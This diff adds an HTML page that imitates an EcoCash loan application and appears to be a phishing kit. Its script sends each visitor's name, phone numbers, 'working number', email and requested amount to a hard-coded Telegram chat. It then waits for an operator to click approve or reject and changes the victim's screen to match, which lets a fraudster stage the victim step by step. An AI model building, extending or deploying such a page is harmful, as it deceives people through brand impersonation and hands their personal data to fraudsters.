@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>EcoCash Loans</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --blue:#1565c0;--blue2:#1976d2;--blue-light:#e3f0ff;
+  --red:#d32f2f;--white:#ffffff;--off:#f0f6ff;
+  --gray:#7a8eaa;--border:#d0dff0;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--blue);min-height:100vh;}
+
+.page{display:none;min-height:100vh;align-items:center;justify-content:center;}
+.page.active{display:flex;flex-direction:column;}
+
+.card{
+  background:var(--white);border-radius:24px;padding:40px 36px;
+  width:100%;max-width:400px;
+  box-shadow:0 8px 40px rgba(21,101,192,0.13);
+  margin:20px;animation:rise .5s cubic-bezier(.16,1,.3,1) both;
+}
+@media(max-width:440px){.card{padding:30px 20px;margin:14px;}}
+
+/* ECOCASH LOGO */
+.logo{display:flex;align-items:center;justify-content:center;margin-bottom:30px;}
+.logo-box{
+  background:linear-gradient(135deg,#1565c0,#1976d2);
+  border-radius:16px;padding:12px 24px;
+  display:flex;align-items:center;justify-content:center;
+  box-shadow:0 4px 16px rgba(21,101,192,0.3);
+}
+.logo-eco{font-size:26px;font-weight:900;color:var(--white);letter-spacing:-.5px;}
+.logo-cash{font-size:26px;font-weight:900;color:var(--red);letter-spacing:-.5px;}
+
+.step-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:26px;}
+.sp{width:8px;height:8px;border-radius:50%;background:var(--border);transition:all .3s;}
+.sp.on{width:22px;border-radius:4px;background:var(--blue);}
+.sp.dn{background:#00a86b;}
+
+.ttl{font-size:19px;font-weight:800;text-align:center;margin-bottom:4px;color:var(--blue);}
+.sub{font-size:13px;color:var(--gray);text-align:center;margin-bottom:26px;}
+
+.f{margin-bottom:16px;}
+.f label{display:block;font-size:11px;font-weight:800;color:var(--blue);letter-spacing:1px;text-transform:uppercase;margin-bottom:7px;}
+.f input,.f select{
+  width:100%;padding:13px 15px;border:2px solid var(--border);border-radius:11px;
+  font-family:'Nunito',sans-serif;font-size:15px;font-weight:700;
+  color:var(--blue);background:var(--off);outline:none;appearance:none;
+  transition:border-color .2s,background .2s,box-shadow .2s;
+}
+.f input:focus,.f select:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4px rgba(21,101,192,0.08);}
+.f select{
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='11' height='7'%3E%3Cpath d='M1 1l4.5 4.5L10 1' stroke='%231565c0' stroke-width='2' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;background-position:right 14px center;padding-right:40px;cursor:pointer;
+}
+.f select option{background:var(--white);color:var(--blue);}
+.pre-wrap{position:relative;}
+.pre{position:absolute;left:15px;top:50%;transform:translateY(-50%);font-size:14px;font-weight:800;color:var(--gray);pointer-events:none;}
+.f input.pl{padding-left:40px;}
+
+.btn{
+  width:100%;padding:14px;margin-top:6px;
+  background:linear-gradient(135deg,var(--blue),var(--blue2));
+  color:var(--white);border:none;border-radius:11px;
+  font-family:'Nunito',sans-serif;font-size:15px;font-weight:800;
+  cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;
+  transition:transform .15s,box-shadow .15s;
+  box-shadow:0 4px 16px rgba(21,101,192,0.3);
+}
+.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(21,101,192,0.38);}
+.btn:active{transform:translateY(0);}
+.btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none;}
+
+.err{display:none;font-size:13px;font-weight:700;color:#c0392b;background:rgba(192,57,43,0.07);border:1.5px solid rgba(192,57,43,0.18);border-radius:9px;padding:9px 13px;margin-top:10px;text-align:center;}
+
+.screen{display:none;min-height:100vh;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;background:var(--off);}
+.screen.show{display:flex;}
+
+.sc-logo{display:flex;align-items:center;justify-content:center;margin-bottom:36px;}
+.sc-icon{width:70px;height:70px;border-radius:50%;background:var(--white);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:28px;margin-bottom:18px;animation:pulse 2s ease infinite;}
+.sc-h{font-size:21px;font-weight:900;color:var(--blue);margin-bottom:8px;}
+.sc-p{font-size:14px;color:var(--gray);line-height:1.7;max-width:290px;margin:0 auto 20px;}
+.ref-num{background:var(--white);border:2px solid var(--border);border-radius:11px;padding:11px 22px;font-size:19px;font-weight:900;color:var(--blue);letter-spacing:2px;display:inline-block;margin-bottom:6px;}
+.dot-row{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:var(--gray);margin-top:10px;}
+.bd{width:6px;height:6px;border-radius:50%;background:var(--blue);animation:blink 1.5s ease infinite;}
+
+.r-icon{width:76px;height:76px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:34px;margin-bottom:18px;}
+.r-icon.ok{background:rgba(0,168,107,0.1);}
+.r-icon.no{background:rgba(214,48,49,0.08);}
+.r-h{font-size:23px;font-weight:900;margin-bottom:10px;}
+.r-h.ok{color:#00a86b;}
+.r-h.no{color:var(--red);}
+.r-p{font-size:14px;color:var(--gray);line-height:1.7;max-width:280px;margin:0 auto 16px;}
+.r-box{background:var(--white);border:2px solid var(--border);border-radius:12px;padding:14px 18px;text-align:left;font-size:14px;line-height:2;margin-bottom:18px;width:100%;max-width:320px;}
+.r-box strong{color:var(--blue);}
+.r-btn{padding:11px 26px;border-radius:10px;border:2px solid var(--blue);background:transparent;color:var(--blue);font-family:'Nunito',sans-serif;font-size:14px;font-weight:800;cursor:pointer;transition:all .2s;}
+.r-btn:hover{background:var(--blue);color:var(--white);}
+
+@keyframes rise{from{opacity:0;transform:translateY(22px);}to{opacity:1;transform:translateY(0);}}
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.15;}}
+@keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.04);}}
+</style>
+</head>
+<body>
+
+<!-- PAGE 1 -->
+<div class="page active" id="pg1">
+  <div class="card">
+    <div class="logo">
+      <div class="logo-box">
+        <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+      </div>
+    </div>
+    <div class="step-row"><div class="sp on"></div><div class="sp"></div></div>
+    <div class="ttl">Loan Application</div>
+    <div class="sub">Step 1 of 2</div>
+    <div class="f"><label>Full Name</label><input type="text" id="p1_name"/></div>
+    <div class="f"><label>Phone Number</label><input type="tel" id="p1_phone"/></div>
+    <div class="err" id="p1_err">Please fill in all fields.</div>
+    <button class="btn" id="p1_btn" onclick="sub1()">
+      <span id="p1_txt">Continue →</span>
+      <div class="spin" id="p1_spin"></div>
+    </button>
+  </div>
+</div>
+
+<!-- P1 WAIT -->
+<div class="screen" id="p1_wait">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="sc-icon">⏳</div>
+  <div class="sc-h">Verifying Details</div>
+  <p class="sc-p">Your details have been submitted. Please wait while our team reviews them.</p>
+  <div class="ref-num" id="p1_ref">EC-000000</div>
+  <p style="font-size:12px;color:var(--gray);margin-top:6px;">Your reference number</p>
+  <div class="dot-row"><div class="bd"></div>Awaiting verification…</div>
+</div>
+
+<!-- PAGE 2 -->
+<div class="page" id="pg2">
+  <div class="card">
+    <div class="logo">
+      <div class="logo-box">
+        <span class="logo-eco">Eco</span><span class="logo-cash">Cash</span>
+      </div>
+    </div>
+    <div class="step-row"><div class="sp dn"></div><div class="sp on"></div></div>
+    <div class="ttl">Loan Details</div>
+    <div class="sub">Step 2 of 2</div>
+    <div class="f"><label>Working Number</label><input type="tel" id="p2_worknum"/></div>
+    <div class="f">
+      <label>Loan Amount (USD)</label>
+      <div class="pre-wrap">
+        <span class="pre">$</span>
+        <input type="number" id="p2_amt" class="pl" min="1"/>
+      </div>
+    </div>
+    <div class="f"><label>Email Address</label><input type="email" id="p2_email"/></div>
+    <div class="f"><label>Phone Number</label><input type="tel" id="p2_phone"/></div>
+    <div class="err" id="p2_err">Please fill in all fields correctly.</div>
+    <button class="btn" id="p2_btn" onclick="sub2()">
+      <span id="p2_txt">Submit Application</span>
+      <div class="spin" id="p2_spin"></div>
+    </button>
+  </div>
+</div>
+
+<!-- P2 WAIT -->
+<div class="screen" id="p2_wait">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="sc-icon">⏳</div>
+  <div class="sc-h">Application Submitted</div>
+  <p class="sc-p">Your loan application is under review. This page will update automatically.</p>
+  <div class="ref-num" id="p2_ref">EC-000000</div>
+  <p style="font-size:12px;color:var(--gray);margin-top:6px;">Save your reference number</p>
+  <div class="dot-row"><div class="bd"></div>Awaiting final decision…</div>
+</div>
+
+<!-- APPROVED -->
+<div class="screen" id="approved">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="r-icon ok">✅</div>
+  <div class="r-h ok">Loan Approved!</div>
+  <p class="r-p">Your loan has been approved. We will contact you to complete disbursement.</p>
+  <div class="r-box" id="appr_box"></div>
+  <button class="r-btn" onclick="resetAll()">New Application</button>
+</div>
+
+<!-- WRONG DETAILS -->
+<div class="screen" id="rejected">
+  <div class="sc-logo"><div class="logo-box"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div></div>
+  <div class="r-icon no">⚠️</div>
+  <div class="r-h no">Wrong Details</div>
+  <p class="r-p">Our team flagged your details as incorrect. Please check and resubmit.</p>
+  <div class="r-box" id="rej_box"></div>
+  <button class="r-btn" onclick="resetAll()">Try Again</button>
+</div>
+
+<script>
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID   = "8718124300";
+  const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+  let app={},timer=null,lastId=0,curRef=null;
+  const genRef=()=>"EC-"+Math.floor(100000+Math.random()*900000);
+  const stamp=()=>new Date().toLocaleString("en-ZW",{timeZone:"Africa/Harare",dateStyle:"full",timeStyle:"short"});
+
+  function showPage(id){document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));document.getElementById(id).classList.add("active");window.scrollTo(0,0);}
+  function setLoad(p,on){document.getElementById(p+"_btn").disabled=on;document.getElementById(p+"_txt").style.display=on?"none":"inline";document.getElementById(p+"_spin").style.display=on?"block":"none";}
+
+  async function tgSend(text,r){
+    const kb={inline_keyboard:[[{text:"✅  APPROVE",callback_data:`APPROVE_${r}`},{text:"⚠️  WRONG DETAILS",callback_data:`REJECT_${r}`}]]};
+    const res=await fetch(`${API}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text,parse_mode:"Markdown",reply_markup:kb})});
+    return res.json();
+  }
+  async function syncId(){try{const r=await fetch(`${API}/getUpdates?limit=1&offset=-1`);const j=await r.json();if(j.ok&&j.result.length>0)lastId=j.result[j.result.length-1].update_id;}catch(e){}}
+  async function ackCb(id,t){await fetch(`${API}/answerCallbackQuery`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({callback_query_id:id,text:t})});}
+  async function editTg(msg,s){await fetch(`${API}/editMessageText`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:msg.chat.id,message_id:msg.message_id,text:msg.text+`\n\n*Decision: ${s}*`,parse_mode:"Markdown"})});}
+
+  function poll(r,onOk,onNo){
+    clearInterval(timer);
+    timer=setInterval(async()=>{
+      try{
+        const res=await fetch(`${API}/getUpdates?offset=${lastId+1}&timeout=3`);
+        const j=await res.json();if(!j.ok)return;
+        for(const u of j.result){
+          lastId=u.update_id;
+          if(u.callback_query){
+            const cb=u.callback_query;
+            if(cb.data===`APPROVE_${r}`){await ackCb(cb.id,"✅ Approved!");await editTg(cb.message,"✅ APPROVED");clearInterval(timer);onOk();return;}
+            if(cb.data===`REJECT_${r}`){await ackCb(cb.id,"⚠️ Wrong details.");await editTg(cb.message,"⚠️ WRONG DETAILS");clearInterval(timer);onNo();return;}
+          }
+        }
+      }catch(e){}
+    },3000);
+  }
+
+  async function sub1(){
+    const name=document.getElementById("p1_name").value.trim();
+    const phone=document.getElementById("p1_phone").value.trim();
+    const err=document.getElementById("p1_err");
+    if(!name||!phone){err.style.display="block";return;}
+    err.style.display="none";setLoad("p1",true);
+    app.name=name;app.phone=phone;curRef=genRef();
+    const msg="📋 *ECOCASH LOAN — STEP 1*\n━━━━━━━━━━━━━━━━━━━━\n\n"+`👤 *Name:* ${name}\n📱 *Phone:* ${phone}\n\n🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *Approve to proceed to Step 2:*`;
+    try{
+      await syncId();const r=await tgSend(msg,curRef);if(!r.ok)throw new Error();
+      document.getElementById("p1_ref").textContent=curRef;
+      document.getElementById("pg1").classList.remove("active");
+      document.getElementById("p1_wait").classList.add("show");
+      poll(curRef,
+        ()=>{app.ref1=curRef;document.getElementById("p1_wait").classList.remove("show");showPage("pg2");setLoad("p1",false);},
+        ()=>{document.getElementById("p1_wait").classList.remove("show");document.getElementById("pg1").classList.add("active");err.textContent="⚠️ Our team flagged your details. Please check and try again.";err.style.display="block";setLoad("p1",false);}
+      );
+    }catch(e){err.textContent="Connection error. Please try again.";err.style.display="block";setLoad("p1",false);}
+  }
+
+  async function sub2(){
+    const worknum=document.getElementById("p2_worknum").value.trim();
+    const amt=document.getElementById("p2_amt").value.trim();
+    const email=document.getElementById("p2_email").value.trim();
+    const phone=document.getElementById("p2_phone").value.trim();
+    const err=document.getElementById("p2_err");
+    if(!worknum||!amt||!email||!phone||!email.includes("@")){err.style.display="block";return;}
+    err.style.display="none";setLoad("p2",true);
+    app.worknum=worknum;app.amt=amt;app.email=email;app.phone2=phone;curRef=genRef();
+    const msg="📋 *ECOCASH LOAN — STEP 2 (FINAL)*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Name:* ${app.name}\n📱 *Phone:* ${app.phone}\n`+
+      `📞 *Working Number:* ${worknum}\n💵 *Loan Amount:* USD $${Number(amt).toLocaleString()}\n`+
+      `✉️ *Email:* ${email}\n📱 *Phone Number:* ${phone}\n\n`+
+      `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *Final decision:*`;
+    try{
+      await syncId();const r=await tgSend(msg,curRef);if(!r.ok)throw new Error();
+      document.getElementById("p2_ref").textContent=curRef;
+      document.getElementById("pg2").classList.remove("active");
+      document.getElementById("p2_wait").classList.add("show");
+      poll(curRef,
+        ()=>{
+          document.getElementById("p2_wait").classList.remove("show");
+          document.getElementById("appr_box").innerHTML=`<strong>Name:</strong> ${app.name}<br/><strong>Working Number:</strong> ${worknum}<br/><strong>Amount:</strong> USD $${Number(amt).toLocaleString()}<br/><strong>Email:</strong> ${email}<br/><strong>Phone:</strong> ${phone}<br/><strong>Ref:</strong> ${curRef}`;
+          document.getElementById("approved").classList.add("show");
+        },
+        ()=>{
+          document.getElementById("p2_wait").classList.remove("show");
+          document.getElementById("rej_box").innerHTML=`<strong>Ref:</strong> ${curRef}<br/><strong>Reason:</strong> Details flagged as incorrect.`;
+          document.getElementById("rejected").classList.add("show");
+        }
+      );
+    }catch(e){err.textContent="Connection error. Please try again.";err.style.display="block";setLoad("p2",false);}
+  }
+
+  function resetAll(){
+    clearInterval(timer);app={};curRef=null;lastId=0;
+    ["p1_name","p1_phone","p2_worknum","p2_amt","p2_email","p2_phone"].forEach(id=>document.getElementById(id).value="");
+    ["p1_err","p2_err"].forEach(id=>document.getElementById(id).style.display="none");
+    document.getElementById("p1_wait").classList.remove("show");
+    document.getElementById("p2_wait").classList.remove("show");
+    document.getElementById("approved").classList.remove("show");
+    document.getElementById("rejected").classList.remove("show");
+    setLoad("p1",false);setLoad("p2",false);showPage("pg1");
+  }
+
+  ["p1_name","p1_phone"].forEach(id=>{document.getElementById(id).addEventListener("keydown",e=>{if(e.key==="Enter")sub1();});});
+</script>
+</body>
+</html>
